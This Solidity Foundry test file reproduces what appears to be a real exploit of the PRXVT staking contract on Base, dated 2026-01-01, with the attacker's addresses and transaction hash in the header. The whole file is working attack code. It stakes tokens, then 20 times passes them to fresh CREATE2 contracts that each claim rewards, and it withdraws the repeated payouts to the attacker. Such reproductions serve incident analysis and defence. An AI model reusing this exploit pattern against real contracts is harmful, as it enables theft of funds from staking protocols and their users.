// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: PRXVT
@Date: 2026-01-01
@Attacker: https://basescan.org/address/0x7407f9bdc4140d5e284ea7de32a9de6037842f45
@Attack Contract: https://basescan.org/address/0x702980b1ed754c214b79192a4d7c39106f19bce9
@TxHash: https://basescan.org/tx/0x88610208c00f5d5ca234e45205a01199c87cb859f881e8b35297cba8325a5494
@Vulnerable Contarct: https://basescan.org/token/0xdac30a5e2612206e2756836ed6764ec5817e6fff
@ChainId: 8453
@GasUsed: 8325033
*/

interface IstPRXVT is IERC20 {
    function claimReward() external;
    function stake(
        uint256 amount
    ) external;
    function earned(
        address account
    ) external view returns (uint256);
}

address constant Attacker = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45;
IERC20 constant PRXVT = IERC20(0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0);
IstPRXVT constant stPRXVT = IstPRXVT(0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff);

contract PRXVTTest is BaseTest {
    function setUp() public {
        vm.createSelectFork("base", 40_230_827);
        vm.deal(Attacker, 2 ether);
        deal(address(PRXVT), address(Attacker), 0);
        fundingToken = address(PRXVT);
        beneficiary = Attacker;
    }

    function testExploit() public balanceLog {
        vm.startPrank(Attacker);
        Attack1 att1 = new Attack1();
        deal(address(PRXVT), address(Attacker), 2_300_000 * 1e18);
        PRXVT.approve(address(att1), 2_300_000 * 1e18);
        att1.prepare(2_300_000 * 1e18);
        att1.attack();
        att1.withdraw();
        vm.stopPrank();
    }
}

contract Attack1 {
    address private owner = Attacker;
    uint256 public nonce;

    function prepare(
        uint256 amount
    ) external {
        PRXVT.transferFrom(msg.sender, address(this), amount);
        PRXVT.approve(address(stPRXVT), amount);
        stPRXVT.stake(amount);
        console.log("Staked PRXVT: ", amount / 1e18);
    }

    function attack() external {
        require(msg.sender == owner);

        uint256 i = 0;

        while (i < 20) {
            _attack();
            i++;
        }
        console.log("Attack complete, Total Claim amount: ", PRXVT.balanceOf(address(this)) / 1e18);
    }

    function _attack() private {
        uint256 stBalance = stPRXVT.balanceOf(address(this));
        if (stBalance == 0) {
            return;
        }

        Attack2 att2 = new Attack2{salt: bytes32(nonce++)}();

        stPRXVT.transfer(address(att2), stBalance);
        att2.execute(address(this));
    }

    function withdraw() external {
        require(msg.sender == owner);

        uint256 prxvtBalance = PRXVT.balanceOf(address(this));
        uint256 stBalance = stPRXVT.balanceOf(address(this));

        if (prxvtBalance > 0) {
            PRXVT.transfer(owner, prxvtBalance);
        }
        if (stBalance > 0) {
            stPRXVT.transfer(owner, stBalance);
        }
        console.log("Withdrawn $PRXVT: ", prxvtBalance / 1e18);
        console.log("Withdrawn $stPRXVT: ", stBalance / 1e18);
    }
}

contract Attack2 {
    function execute(
        address att1
    ) public {
        require(msg.sender == att1);

        uint256 rewardAmount = stPRXVT.earned(address(this));
        if (rewardAmount > 0) {
            stPRXVT.claimReward();
        }
        uint256 stBalance = stPRXVT.balanceOf(address(this));
        if (stBalance > 0) {
            stPRXVT.transfer(att1, stBalance);
        }
        uint256 prxvtBalance = PRXVT.balanceOf(address(this));
        if (prxvtBalance > 0) {
            PRXVT.transfer(att1, prxvtBalance);
        }
    }
}
